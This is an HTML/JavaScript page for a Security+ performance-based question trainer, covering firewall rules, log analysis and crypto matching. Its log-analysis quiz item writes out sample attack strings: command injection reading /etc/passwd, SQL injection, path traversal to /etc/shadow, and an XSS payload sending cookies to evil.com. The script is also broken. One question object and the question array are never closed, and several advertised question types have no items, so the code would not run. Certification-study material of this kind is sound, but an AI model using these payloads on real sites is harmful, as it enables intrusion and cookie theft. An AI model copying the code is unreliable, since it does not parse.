<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PBQ Trainer -- Security+</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#07080c;--panel:#0e1018;--panel2:#141720;--panel3:#1a1e29;
  --border:rgba(255,255,255,0.06);--border2:rgba(255,255,255,0.1);--border3:rgba(255,255,255,0.18);
  --text:#e4e8f5;--text2:#6b7494;--text3:#3a4060;
  --accent:#00e5ff;--green:#00ff88;--red:#ff3d5a;--amber:#ffcc00;--purple:#bf87ff;--teal:#4fd1c5;
  --mono:'Courier New',monospace;
}
*{font-family:'Segoe UI',sans-serif}
body{background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse 60% 50% at 20% 0%,rgba(255,204,0,0.03) 0%,transparent 60%),radial-gradient(ellipse 50% 40% at 80% 100%,rgba(0,229,255,0.03) 0%,transparent 60%);pointer-events:none}
body::after{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(255,204,0,0.012) 1px,transparent 1px),linear-gradient(90deg,rgba(255,204,0,0.012) 1px,transparent 1px);background-size:40px 40px;pointer-events:none}
.wrap{position:relative;z-index:1;max-width:860px;margin:0 auto;padding:32px 20px 80px}
.eyebrow{font-family:var(--mono);font-size:10px;letter-spacing:.25em;text-transform:uppercase;color:var(--amber);margin-bottom:8px;display:flex;align-items:center;gap:8px}
.eyebrow::before{content:'';width:20px;height:1px;background:var(--amber)}
h1{font-size:clamp(26px,5vw,40px);font-weight:700;line-height:1.1;letter-spacing:-.02em;margin-bottom:8px}
h1 em{font-style:normal;color:var(--amber)}
.subtitle{font-family:var(--mono);font-size:11px;color:var(--text2);margin-bottom:28px}

/* PROGRESS */
.stats-bar{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:18px}
.sb{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:13px;position:relative;overflow:hidden}
.sb::before{content:'';position:absolute;top:0;left:0;right:0;height:2px}
.sb.s-prog::before{background:var(--amber)}
.sb.s-correct::before{background:var(--green)}
.sb.s-wrong::before{background:var(--red)}
.sb.s-acc::before{background:var(--amber)}
.sb-val{font-family:var(--mono);font-size:22px;font-weight:500;line-height:1}
.sb.s-correct .sb-val{color:var(--green)}
.sb.s-wrong .sb-val{color:var(--red)}
.sb.s-acc .sb-val{color:var(--amber)}
.sb-lbl{font-family:var(--mono);font-size:9px;letter-spacing:.12em;text-transform:uppercase;color:var(--text2);margin-top:4px}
.prog-wrap{height:3px;background:rgba(255,255,255,0.06);border-radius:99px;margin-bottom:24px;overflow:hidden}
.prog-fill{height:100%;background:var(--amber);border-radius:99px;transition:width .4s ease}

/* PBQ CARD */
.pbq-card{background:var(--panel);border:1px solid var(--border2);border-radius:20px;padding:28px;margin-bottom:16px;position:relative;overflow:hidden}
.pbq-card::after{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(255,204,0,0.4),transparent)}
.pbq-meta{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:16px}
.pbq-badge{font-family:var(--mono);font-size:9px;letter-spacing:.14em;text-transform:uppercase;padding:3px 10px;border-radius:5px;background:rgba(255,204,0,0.1);color:var(--amber);border:1px solid rgba(255,204,0,0.2)}
.pbq-type{font-family:var(--mono);font-size:9px;letter-spacing:.14em;text-transform:uppercase;padding:3px 10px;border-radius:5px;background:rgba(0,229,255,0.1);color:var(--accent);border:1px solid rgba(0,229,255,0.2)}
.pbq-num{font-family:var(--mono);font-size:10px;color:var(--text3)}
.pbq-scenario{background:var(--panel2);border:1px solid var(--border2);border-left:3px solid var(--amber);border-radius:10px;padding:14px 16px;margin-bottom:16px}
.pbq-scenario-lbl{font-family:var(--mono);font-size:9px;letter-spacing:.18em;text-transform:uppercase;color:var(--amber);margin-bottom:8px}
.pbq-scenario-text{font-size:13px;color:var(--text2);line-height:1.8;font-family:var(--mono);white-space:pre-wrap}
.pbq-q{font-size:15px;font-weight:500;line-height:1.65;color:var(--text);margin-bottom:20px}

/* FIREWALL SIM */
.fw-table{width:100%;border-collapse:collapse;margin-bottom:16px;font-family:var(--mono);font-size:12px}
.fw-table th{background:var(--panel3);color:var(--text3);padding:8px 10px;text-align:left;border:1px solid var(--border2);font-size:10px;letter-spacing:.08em;text-transform:uppercase}
.fw-table td{padding:8px 6px;border:1px solid var(--border);background:var(--panel2)}
.fw-table td.fixed{color:var(--text2)}
.fw-table select{background:var(--panel3);color:var(--text);border:1px solid var(--border2);border-radius:6px;padding:4px 8px;font-family:var(--mono);font-size:11px;width:100%;cursor:pointer;touch-action:manipulation}
.fw-table select:focus{outline:none;border-color:var(--accent)}
.fw-table td.correct-cell select{border-color:var(--green);color:var(--green)}
.fw-table td.wrong-cell select{border-color:var(--red);color:var(--red)}

/* LOG ANALYSIS */
.log-entry{background:var(--panel2);border:1px solid var(--border);border-radius:8px;padding:12px;margin-bottom:10px}
.log-header{display:flex;gap:12px;align-items:flex-start;margin-bottom:8px;flex-wrap:wrap}
.log-time{font-family:var(--mono);font-size:10px;color:var(--accent);flex-shrink:0}
.log-src{font-family:var(--mono);font-size:10px;color:var(--teal);flex-shrink:0}
.log-event{font-family:var(--mono);font-size:11px;color:var(--text2);line-height:1.5;flex:1;min-width:0}
.log-select{width:100%;background:var(--panel3);color:var(--text);border:1px solid var(--border2);border-radius:6px;padding:6px 8px;font-family:var(--mono);font-size:11px;cursor:pointer;touch-action:manipulation}
.log-select:focus{outline:none;border-color:var(--accent)}
.log-entry.correct .log-select{border-color:var(--green);color:var(--green)}
.log-entry.wrong .log-select{border-color:var(--red);color:var(--red)}

/* NETWORK ZONE */
.zone-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px}
.zone-box{background:var(--panel2);border:2px dashed var(--border2);border-radius:10px;padding:14px;min-height:80px}
.zone-box-lbl{font-family:var(--mono);font-size:9px;letter-spacing:.14em;text-transform:uppercase;color:var(--text3);margin-bottom:8px}
.zone-box.correct-zone{border-color:var(--green);border-style:solid}
.zone-box.wrong-zone{border-color:var(--red);border-style:solid}
.device-pool{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:16px;padding:12px;background:var(--panel2);border-radius:10px;border:1px solid var(--border)}
.device-pool-lbl{font-family:var(--mono);font-size:9px;letter-spacing:.14em;text-transform:uppercase;color:var(--text3);margin-bottom:8px;width:100%}
.device-chip{font-family:var(--mono);font-size:11px;padding:5px 12px;border-radius:6px;border:1px solid var(--border2);background:var(--panel3);color:var(--text2);cursor:pointer;transition:all .15s;touch-action:manipulation;user-select:none}
.device-chip:hover{border-color:var(--accent);color:var(--accent)}
.device-chip.placed{opacity:.4;pointer-events:none}
.zone-device{font-family:var(--mono);font-size:11px;padding:4px 10px;border-radius:5px;background:var(--panel3);color:var(--accent);border:1px solid var(--accent);display:inline-flex;align-items:center;gap:6px;margin:3px;cursor:pointer;touch-action:manipulation}
.zone-device .remove{color:var(--text3);font-size:9px}
.zone-device:hover .remove{color:var(--red)}
.zone-select{width:100%;background:var(--panel3);color:var(--text);border:1px solid var(--border2);border-radius:6px;padding:6px 8px;font-family:var(--mono);font-size:11px;cursor:pointer;margin-bottom:8px;touch-action:manipulation}

/* INCIDENT RESPONSE ORDER */
.ir-order-list{margin-bottom:16px}
.ir-item{display:flex;align-items:center;gap:12px;background:var(--panel2);border:1px solid var(--border2);border-radius:8px;padding:12px;margin-bottom:8px}
.ir-num{font-family:var(--mono);font-size:10px;color:var(--text3);min-width:20px}
.ir-text{font-size:13px;color:var(--text);flex:1}
.ir-select{background:var(--panel3);color:var(--text);border:1px solid var(--border2);border-radius:6px;padding:5px 8px;font-family:var(--mono);font-size:11px;cursor:pointer;touch-action:manipulation}
.ir-item.correct .ir-select{border-color:var(--green);color:var(--green)}
.ir-item.wrong .ir-select{border-color:var(--red);color:var(--red)}

/* ACL / PERMISSION CONFIG */
.acl-table{width:100%;border-collapse:collapse;margin-bottom:16px;font-family:var(--mono);font-size:12px}
.acl-table th{background:var(--panel3);color:var(--text3);padding:8px 10px;text-align:left;border:1px solid var(--border2);font-size:10px;letter-spacing:.08em;text-transform:uppercase}
.acl-table td{padding:8px 6px;border:1px solid var(--border);background:var(--panel2);color:var(--text2)}
.acl-table select{background:var(--panel3);color:var(--text);border:1px solid var(--border2);border-radius:6px;padding:4px 8px;font-family:var(--mono);font-size:11px;width:100%;cursor:pointer;touch-action:manipulation}
.acl-table td.correct-cell select{border-color:var(--green);color:var(--green)}
.acl-table td.wrong-cell select{border-color:var(--red);color:var(--red)}

/* CRYPTO / MATCH */
.match-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px}
.match-col-lbl{font-family:var(--mono);font-size:9px;letter-spacing:.14em;text-transform:uppercase;color:var(--text3);margin-bottom:10px}
.match-item{background:var(--panel2);border:1px solid var(--border2);border-radius:8px;padding:12px;margin-bottom:8px;display:flex;align-items:center;gap:10px}
.match-item-text{font-size:13px;color:var(--text);flex:1}
.match-select{background:var(--panel3);color:var(--text);border:1px solid var(--border2);border-radius:6px;padding:5px 8px;font-family:var(--mono);font-size:10px;cursor:pointer;width:100%;touch-action:manipulation}
.match-item.correct .match-select{border-color:var(--green);color:var(--green)}
.match-item.wrong .match-select{border-color:var(--red);color:var(--red)}

/* EXPLANATION */
.pbq-explanation{display:none;background:var(--panel2);border:1px solid var(--border2);border-left:3px solid var(--amber);border-radius:10px;padding:14px 16px;margin-bottom:14px}
.pbq-explanation.show{display:block}
.exp-lbl{font-family:var(--mono);font-size:9px;letter-spacing:.15em;text-transform:uppercase;color:var(--amber);margin-bottom:8px}
.exp-text{font-size:13px;color:var(--text2);line-height:1.7}
.exp-text strong{color:var(--text)}
.exp-detail{margin-top:8px;font-family:var(--mono);font-size:11px;color:var(--text3);line-height:1.6}

/* BUTTONS */
.btn-submit{width:100%;padding:13px;border-radius:10px;border:none;background:var(--amber);color:var(--bg);font-family:var(--mono);font-size:11px;letter-spacing:.1em;text-transform:uppercase;cursor:pointer;font-weight:600;margin-bottom:10px;transition:all .15s;touch-action:manipulation}
.btn-submit:hover{background:#ffdb4d}
.btn-submit:disabled{opacity:.4;cursor:default}
.btn-next{width:100%;padding:12px;border-radius:10px;border:1px solid var(--border2);background:transparent;color:var(--text2);font-family:var(--mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;cursor:pointer;display:none;transition:all .15s;touch-action:manipulation}
.btn-next:hover{border-color:var(--amber);color:var(--amber)}

/* SCORE FEEDBACK */
.score-feedback{display:none;font-family:var(--mono);font-size:12px;padding:10px 14px;border-radius:8px;margin-bottom:12px;text-align:center}
.score-feedback.show{display:block}
.score-feedback.perfect{background:rgba(0,255,136,0.1);color:var(--green);border:1px solid rgba(0,255,136,0.2)}
.score-feedback.partial{background:rgba(255,204,0,0.1);color:var(--amber);border:1px solid rgba(255,204,0,0.2)}
.score-feedback.failed{background:rgba(255,61,90,0.1);color:var(--red);border:1px solid rgba(255,61,90,0.2)}

/* RESULTS */
.results-wrap{text-align:center;padding:32px 0 20px}
.results-ring{width:140px;height:140px;margin:0 auto 20px;position:relative}
.results-ring svg{transform:rotate(-90deg)}
.ring-score{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center}
.ring-pct{font-family:var(--mono);font-size:32px;font-weight:600;color:var(--text)}
.ring-lbl{font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:.1em;text-transform:uppercase}
.results-verdict{font-size:22px;font-weight:700;margin-bottom:6px}
.results-sub{font-family:var(--mono);font-size:11px;color:var(--text2);margin-bottom:28px}
.breakdown{display:grid;grid-template-columns:repeat(2,1fr);gap:12px;margin-bottom:28px;text-align:left}
.bd-card{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:16px}
.bd-title{font-family:var(--mono);font-size:9px;letter-spacing:.12em;text-transform:uppercase;margin-bottom:10px}
.bd-bar-bg{height:5px;background:rgba(255,255,255,0.06);border-radius:99px;overflow:hidden;margin-bottom:6px}
.bd-bar-fill{height:100%;border-radius:99px;transition:width 1s ease}
.bd-score{font-family:var(--mono);font-size:22px;font-weight:600}
.bd-detail{font-family:var(--mono);font-size:10px;color:var(--text3);margin-top:4px}
.btn-retake{font-family:var(--mono);font-size:10px;letter-spacing:.1em;text-transform:uppercase;padding:12px 36px;background:transparent;border:1px solid var(--border2);color:var(--text2);border-radius:10px;cursor:pointer;transition:all .2s;margin-right:10px;touch-action:manipulation}
.btn-retake:hover{border-color:var(--amber);color:var(--amber)}

@media(max-width:600px){
  .stats-bar{grid-template-columns:repeat(2,1fr)}
  .zone-grid{grid-template-columns:1fr}
  .match-grid{grid-template-columns:1fr}
  .breakdown{grid-template-columns:1fr}
  .fw-table{font-size:10px}
  .fw-table select{font-size:10px}
}
</style>
</head>
<body>
<div class="wrap">
  <div class="eyebrow">CompTIA Security+ &middot; SY0-701 &middot; All Domains</div>
  <h1>Performance-Based <em>Questions</em></h1>
  <p class="subtitle">20 interactive simulations &middot; firewall config &middot; log analysis &middot; network zones &middot; ACL &middot; IR ordering &middot; crypto matching</p>
  <div class="stats-bar">
    <div class="sb s-prog"><div class="sb-val" id="s-prog">0/20</div><div class="sb-lbl">Progress</div></div>
    <div class="sb s-correct"><div class="sb-val" id="s-correct">0</div><div class="sb-lbl">Correct</div></div>
    <div class="sb s-wrong"><div class="sb-val" id="s-wrong">0</div><div class="sb-lbl">Wrong</div></div>
    <div class="sb s-acc"><div class="sb-val" id="s-acc">--</div><div class="sb-lbl">Accuracy</div></div>
  </div>
  <div class="prog-wrap"><div class="prog-fill" id="prog-fill" style="width:0%"></div></div>
  <div id="pbq-area"></div>
  <div id="results-area" style="display:none"></div>
</div>
<script>
function logToDashboard(domain,type,score){
  try{
    var s=JSON.parse(localStorage.getItem('sp_sessions')||'[]');
    var now=new Date();
    s.push({domain:domain,type:type,score:score,date:now.toLocaleDateString('en-CA',{month:'short',day:'numeric'}),ts:now.getTime()});
    localStorage.setItem('sp_sessions',JSON.stringify(s));
  }catch(e){}
}

// ── QUESTION BANK ──────────────────────────────────────────────────────────

var PBQ_BANK=[

// ── FIREWALL SIMULATIONS ──────────────────────────────────────────────────

{id:'fw1',type:'firewall',domain:3,title:'Firewall Rule Configuration',
 scenario:'You are configuring an edge firewall for a small company. The security policy requires the rules below. Set the Action, Protocol, and Port for each rule.',
 policy:'Security requirements:\n* Allow HTTP and HTTPS from any source to the web server (10.0.2.20)\n* Allow SSH from the management network (192.168.10.0/24) only\n* Block all FTP traffic from any source\n* Allow SMTP from any source to the mail server (10.0.2.25)\n* Deny all other inbound traffic by default',
 rules:[
   {id:0,src:'ANY',dst:'10.0.2.20',hint:'HTTP web traffic',correctAction:'Allow',correctProto:'TCP',correctPort:'80'},
   {id:1,src:'ANY',dst:'10.0.2.20',hint:'HTTPS web traffic',correctAction:'Allow',correctProto:'TCP',correctPort:'443'},
   {id:2,src:'192.168.10.0/24',dst:'ANY',hint:'SSH admin only',correctAction:'Allow',correctProto:'TCP',correctPort:'22'},
   {id:3,src:'ANY',dst:'ANY',hint:'Block FTP',correctAction:'Deny',correctProto:'TCP',correctPort:'21'},
   {id:4,src:'ANY',dst:'10.0.2.25',hint:'Email delivery',correctAction:'Allow',correctProto:'TCP',correctPort:'25'},
   {id:5,src:'ANY',dst:'ANY',hint:'Default policy',correctAction:'Deny',correctProto:'ANY',correctPort:'ANY'},
 ],
 e:'HTTP=TCP/80, HTTPS=TCP/443, SSH=TCP/22, FTP=TCP/21 (block -- plaintext and insecure), SMTP=TCP/25. A default deny-all rule at the bottom ensures only explicitly permitted traffic passes.'},

{id:'fw2',type:'firewall',domain:3,title:'DMZ Firewall Policy',
 scenario:'Configure the internal firewall separating the DMZ from the internal LAN. The DMZ hosts a web server and an email relay.',
 policy:'Security requirements:\n* Allow HTTPS from DMZ web server (172.16.1.10) to internal app server (10.10.1.50) on port 8443\n* Allow internal DNS server (10.10.1.53) to respond to DNS queries from DMZ hosts\n* Block all direct RDP from DMZ to internal network\n* Allow logging traffic from all DMZ hosts to SIEM (10.10.1.200) on UDP 514\n* Deny all other DMZ-to-internal traffic',
 rules:[
   {id:0,src:'172.16.1.10',dst:'10.10.1.50',hint:'App backend traffic',correctAction:'Allow',correctProto:'TCP',correctPort:'8443'},
   {id:1,src:'10.10.1.53',dst:'172.16.1.0/24',hint:'DNS responses to DMZ',correctAction:'Allow',correctProto:'UDP',correctPort:'53'},
   {id:2,src:'172.16.1.0/24',dst:'10.10.0.0/8',hint:'Block remote desktop',correctAction:'Deny',correctProto:'TCP',correctPort:'3389'},
   {id:3,src:'172.16.1.0/24',dst:'10.10.1.200',hint:'Syslog to SIEM',correctAction:'Allow',correctProto:'UDP',correctPort:'514'},
   {id:4,src:'172.16.1.0/24',dst:'10.10.0.0/8',hint:'Default DMZ block',correctAction:'Deny',correctProto:'ANY',correctPort:'ANY'},
 ],
 e:'DMZ servers should never initiate connections to the internal LAN except via explicitly permitted rules. RDP (TCP/3389) from DMZ to internal is a critical risk -- attackers who compromise a DMZ host would immediately pivot inward. Syslog uses UDP/514. DNS responses originate from the DNS server.'},

{id:'fw3',type:'firewall',domain:3,title:'VPN Gateway Rules',
 scenario:'Configure rules for a VPN gateway firewall that allows remote workers to access internal resources.',
 policy:'Security requirements:\n* Allow IKE/ISAKMP (VPN key exchange) from any external IP to VPN gateway (203.0.113.10)\n* Allow IPSec ESP traffic from any external IP to VPN gateway\n* Allow authenticated VPN users (172.30.0.0/22) to reach internal file server (10.50.1.20) on SMB\n* Allow VPN users to reach internal DNS (10.50.1.53)\n* Block VPN users from reaching the server management VLAN (10.50.99.0/24)\n* Deny everything else',
 rules:[
   {id:0,src:'ANY',dst:'203.0.113.10',hint:'VPN key exchange',correctAction:'Allow',correctProto:'UDP',correctPort:'500'},
   {id:1,src:'ANY',dst:'203.0.113.10',hint:'IPSec tunnel traffic',correctAction:'Allow',correctProto:'ESP',correctPort:'ANY'},
   {id:2,src:'172.30.0.0/22',dst:'10.50.1.20',hint:'File share access',correctAction:'Allow',correctProto:'TCP',correctPort:'445'},
   {id:3,src:'172.30.0.0/22',dst:'10.50.1.53',hint:'DNS resolution',correctAction:'Allow',correctProto:'UDP',correctPort:'53'},
   {id:4,src:'172.30.0.0/22',dst:'10.50.99.0/24',hint:'Block mgmt VLAN',correctAction:'Deny',correctProto:'ANY',correctPort:'ANY'},
   {id:5,src:'ANY',dst:'ANY',hint:'Default deny',correctAction:'Deny',correctProto:'ANY',correctPort:'ANY'},
 ],
 e:'IKE uses UDP/500 for key exchange (UDP/4500 for NAT traversal). IPSec ESP is a protocol, not a port. SMB file sharing uses TCP/445. Blocking management VLANs from VPN users limits lateral movement if a remote user is compromised.'},

// ── LOG ANALYSIS SIMULATIONS ──────────────────────────────────────────────

{id:'log1',type:'logs',domain:4,title:'Web Application Log Analysis',
 scenario:'Analyze these Apache access log entries from a production web server. Classify each event.',
 logEntries:[
   {id:0,time:'09:14:02',src:'45.33.32.156',event:"GET /admin/config.php?cmd=cat%20/etc/passwd HTTP/1.1 -- 200 OK",options:['Normal web traffic','Command injection / LFI attempt','SQL injection attempt','Directory traversal'],correct:1},
   {id:1,time:'09:14:03',src:'45.33.32.156',event:"GET /index.php?id=1' OR '1'='1 HTTP/1.1 -- 500 Internal Server Error",options:['Normal traffic','XSS attempt','SQL injection attempt','Path traversal'],correct:2},
   {id:2,time:'09:14:08',src:'45.33.32.156',event:"POST /wp-login.php HTTP/1.1 -- 200 OK (1,847 attempts in 4 min)",options:['Normal login activity','Brute force against login portal','Credential stuffing','Password spray'],correct:1},
   {id:3,time:'09:18:55',src:'10.0.0.55',event:"GET /../../../etc/shadow HTTP/1.1 -- 403 Forbidden",options:['Normal request','Directory traversal attempt','SQL injection','XSS attempt'],correct:1},
   {id:4,time:'09:21:30',src:'45.33.32.156',event:"GET /search?q=&lt;script&gt;document.location='http://evil.com/?c='+document.cookie+'&lt;/script&gt;",options:['Normal search query','Reflected XSS cookie theft attempt','SQL injection','CSRF attack'],correct:1},
 ],

{id:'crypto1',type:'match',domain:1,title:'Cryptographic Algorithm Matching',
 scenario:'Match each cryptographic algorithm or concept to its correct description.',
 pairs:[
   {term:'AES-256',match:'Symmetric block cipher -- current standard for bulk data encryption'},
   {term:'RSA-2048',match:'Asymmetric algorithm -- uses public/private key pair for encryption and digital signatures'},
   {term:'SHA-256',match:'One-way hash function producing 256-bit digest -- used for integrity verification'},
   {term:'ECDH',match:'Elliptic curve Diffie-Hellman -- key exchange providing perfect forward secrecy'},
   {term:'HMAC',match:'Keyed hash providing both integrity and authenticity using a shared secret'},
   {term:'bcrypt',match:'Password hashing function with built-in salting and work factor to resist brute force'},
 ],
 e:'AES-256: symmetric (same key to encrypt/decrypt), fast, used for data at rest and TLS bulk encryption. RSA: asymmetric (public encrypts, private decrypts), slower, used for key exchange and signatures. SHA-256: one-way, cannot reverse, used for file integrity and password storage (with salt). ECDH: key exchange -- derives shared secret without transmitting it. HMAC: adds a secret key to hashing for authentication. bcrypt: password-specific hashing with adaptive cost to stay ahead of hardware improvements.'},

{id:'crypto2',type:'match',domain:1,title:'PKI Component Matching',
 scenario:'Match each PKI component or term to its correct role or description.',
 pairs:[
   {term:'Root CA',match:'Trust anchor -- signs intermediate CA certificates, kept offline for security'},
   {term:'Intermediate CA',match:'Issues end-entity certificates on behalf of the root CA, online and operational'},
   {term:'CRL',match:'Published list of certificates revoked before their expiry date'},
   {term:'OCSP',match:'Real-time online certificate status checking -- faster alternative to CRL'},
   {term:'CSR',match:'Certificate Signing Request -- sent to CA containing the public key and identity information'},
   {term:'Certificate Pinning',match:'Hard-codes expected certificate in an application to prevent MITM using rogue CA certificates'},
 ],
 e:'Root CA is kept offline to protect the trust anchor -- compromise of root invalidates the entire PKI. Intermediate CAs are online and operational for certificate issuance. CRL is a periodic batch list; OCSP provides real-time revocation status. CSR is the request sent to the CA (contains public key, not private key). Certificate pinning is used in mobile apps and high-security connections to prevent MITM via fraudulent certificates from rogue CAs.'},

{id:'crypto3',type:'match',domain:1,title:'Authentication Protocol Matching',
 scenario:'Match each authentication protocol or technology to its primary function.',
 pairs:[
   {term:'SAML 2.0',match:'XML-based federation protocol for SSO between Identity Providers and Service Providers'},
   {term:'OAuth 2.0',match:'Authorisation framework that allows delegated access without sharing credentials'},
   {term:'OpenID Connect',match:'Identity layer built on top of OAuth 2.0 that adds authentication and user identity'},
   {term:'Kerberos',match:'Ticket-based authentication protocol used in Active Directory -- uses KDC and TGT'},
   {term:'RADIUS',match:'Centralised AAA protocol using UDP for network access authentication'},
   {term:'LDAP',match:'Directory access protocol used to query and authenticate against directory services like AD'},
 ],
 e:'SAML: enterprise SSO/federation (XML assertions between IdP and SP). OAuth 2.0: authorisation delegation (allow app A to access app B). OIDC: adds identity (who is the user) on top of OAuth 2.0. Kerberos: AD authentication using tickets -- KDC issues TGT, used to get service tickets. RADIUS: AAA over UDP/1812-1813 for VPN and 802.1X. LDAP: TCP/389 (LDAPS/636) for querying directory services.'},

// ── STATE ──────────────────────────────────────────────────────────────────

var questions=[], qi=0, correct=0, wrong=0;
var typeStats={};
var TYPE_LABELS={'firewall':'Firewall Config','logs':'Log Analysis','zones':'Network Zones','acl':'ACL / Permissions','ir-order':'IR Ordering','match':'Crypto Matching'};
var TYPE_COLORS={'firewall':'var(--accent)','logs':'var(--red)','zones':'var(--teal)','acl':'var(--purple)','ir-order':'var(--amber)','match':'var(--green)'};

function shuffle(a){return[].concat(a).sort(function(){return Math.random()-.5;});}

function buildQuestions(){
  var pool=shuffle(PBQ_BANK.slice());
  return pool.slice(0,20);
}

function updateStats(){
  var total=correct+wrong;
  document.getElementById('s-prog').textContent=qi+'/20';
  document.getElementById('s-correct').textContent=correct;
  document.getElementById('s-wrong').textContent=wrong;
  document.getElementById('s-acc').textContent=total?Math.round(correct/total*100)+'%':'--';
  document.getElementById('prog-fill').style.width=Math.round(qi/20*100)+'%';
}

// ── RENDER DISPATCHER ──────────────────────────────────────────────────────

function renderQ(){
  if(qi>=questions.length){showResults();return;}
  var q=questions[qi];
  var typeLabel=TYPE_LABELS[q.type]||q.type;
  var area=document.getElementById('pbq-area');

  var html='<div class="pbq-card">';
  html+='<div class="pbq-meta">';
  html+='<div style="display:flex;gap:8px;flex-wrap:wrap">';
  html+='<span class="pbq-badge">Domain '+q.domain+'</span>';
  html+='<span class="pbq-type">'+typeLabel+'</span>';
  html+='</div>';
  html+='<span class="pbq-num">Q'+(qi+1)+' of 20</span>';
  html+='</div>';
  html+='<div class="pbq-q" style="font-size:16px;font-weight:700;margin-bottom:4px">'+q.title+'</div>';
  html+='<div class="pbq-scenario"><div class="pbq-scenario-lbl">Scenario</div><div class="pbq-scenario-text">'+q.scenario+'</div></div>';
  if(q.policy){
    html+='<div class="pbq-scenario" style="border-left-color:var(--accent)"><div class="pbq-scenario-lbl" style="color:var(--accent)">Requirements</div><div class="pbq-scenario-text">'+q.policy+'</div></div>';
  }
  html+='<div class="pbq-q" id="pbq-task"></div>';
  html+='<div id="sim-area"></div>';
  html+='<div class="score-feedback" id="score-fb"></div>';
  html+='<div class="pbq-explanation" id="pbq-exp"><div class="exp-lbl">Explanation</div><div class="exp-text">'+q.e+'</div></div>';
  html+='<button class="btn-submit" id="btn-submit">Submit Answer</button>';
  html+='<button class="btn-next" id="btn-next">'+(qi===questions.length-1?'See results':'Next')+'</button>';
  html+='</div>';
  area.innerHTML=html;

  // Render the specific simulation type
  if(q.type==='firewall') renderFirewall(q);
  else if(q.type==='logs') renderLogs(q);
  else if(q.type==='zones') renderZones(q);
  else if(q.type==='acl') renderACL(q);
  else if(q.type==='ir-order') renderIROrder(q);
  else if(q.type==='match') renderMatch(q);

  var sb=document.getElementById('btn-submit');
  if(sb) sb.onclick=function(){submitAnswer();};
  var nb=document.getElementById('btn-next');
  if(nb) nb.onclick=function(){nextQ();};
}

// ── FIREWALL RENDERER ──────────────────────────────────────────────────────

function renderFirewall(q){
  var html='<div style="overflow-x:auto"><table class="fw-table"><thead><tr>';
  html+='<th>#</th><th>Source</th><th>Destination</th><th>Action</th><th>Protocol</th><th>Port</th><th style="color:var(--text3)">Hint</th>';
  html+='</tr></thead><tbody>';
  for(var i=0;i<q.rules.length;i++){
    var r=q.rules[i];
    html+='<tr>';
    html+='<td class="fixed">'+(i+1)+'</td>';
    html+='<td class="fixed">'+r.src+'</td>';
    html+='<td class="fixed">'+r.dst+'</td>';
    html+='<td id="cell-a-'+i+'"><select id="sel-a-'+i+'"><option value="">--</option><option>Allow</option><option>Deny</option><option>Alert</option><option>Block</option></select></td>';
    html+='<td id="cell-p-'+i+'"><select id="sel-p-'+i+'"><option value="">--</option><option>TCP</option><option>UDP</option><option>ESP</option><option>ANY</option></select></td>';
    html+='<td id="cell-port-'+i+'"><select id="sel-port-'+i+'"><option value="">--</option><option>21</option><option>22</option><option>23</option><option>25</option><option>53</option><option>80</option><option>443</option><option>445</option><option>500</option><option>514</option><option>3389</option><option>8443</option><option>ANY</option></select></td>';
    html+='<td class="fixed" style="color:var(--text3);font-size:10px">'+r.hint+'</td>';
    html+='</tr>';
  }
  html+='</tbody></table></div>';
  document.getElementById('sim-area').innerHTML=html;
}

function gradeFirewall(q){
  var pts=0; var total=q.rules.length*3;
  for(var i=0;i<q.rules.length;i++){
    var r=q.rules[i];
    var a=document.getElementById('sel-a-'+i); var p=document.getElementById('sel-p-'+i); var port=document.getElementById('sel-port-'+i);
    if(!a||!p||!port) continue;
    var aOk=a.value===r.correctAction; var pOk=p.value===r.correctProto; var portOk=port.value===r.correctPort;
    if(aOk) pts++; if(pOk) pts++; if(portOk) pts++;
    var ca=document.getElementById('cell-a-'+i); var cp=document.getElementById('cell-p-'+i); var cport=document.getElementById('cell-port-'+i);
    if(ca) ca.className=aOk?'correct-cell':'wrong-cell';
    if(cp) cp.className=pOk?'correct-cell':'wrong-cell';
    if(cport) cport.className=portOk?'correct-cell':'wrong-cell';
    // Show correct values
    if(!aOk&&a){var opt=document.createElement('option');opt.value=r.correctAction;opt.text='Correct: '+r.correctAction;a.appendChild(opt);}
    if(!pOk&&p){var opt2=document.createElement('option');opt2.value=r.correctProto;opt2.text='Correct: '+r.correctProto;p.appendChild(opt2);}
    if(!portOk&&port){var opt3=document.createElement('option');opt3.value=r.correctPort;opt3.text='Correct: '+r.correctPort;port.appendChild(opt3);}
  }
  return {pts:pts,total:total};
}

// ── LOG RENDERER ──────────────────────────────────────────────────────────

function renderLogs(q){
  var html='';
  for(var i=0;i<q.logEntries.length;i++){
    var e=q.logEntries[i];
    html+='<div class="log-entry" id="log-entry-'+i+'">';
    html+='<div class="log-header"><span class="log-time">'+e.time+'</span><span class="log-src">'+e.src+'</span><span class="log-event">'+e.event+'</span></div>';
    html+='<select class="log-select" id="log-sel-'+i+'"><option value="">-- Classify this event --</option>';
    for(var j=0;j<e.options.length;j++) html+='<option value="'+j+'">'+e.options[j]+'</option>';
    html+='</select></div>';
  }
  document.getElementById('sim-area').innerHTML=html;
}

function gradeLogs(q){
  var pts=0;
  for(var i=0;i<q.logEntries.length;i++){
    var e=q.logEntries[i];
    var sel=document.getElementById('log-sel-'+i);
    var entry=document.getElementById('log-entry-'+i);
    if(!sel||!entry) continue;
    var ok=parseInt(sel.value)===e.correct;
    if(ok){pts++;entry.classList.add('correct');}
    else{entry.classList.add('wrong');sel.value=e.correct;}
    sel.disabled=true;
  }
  return {pts:pts,total:q.logEntries.length};
}

// ── ZONE RENDERER ─────────────────────────────────────────────────────────

function renderZones(q){
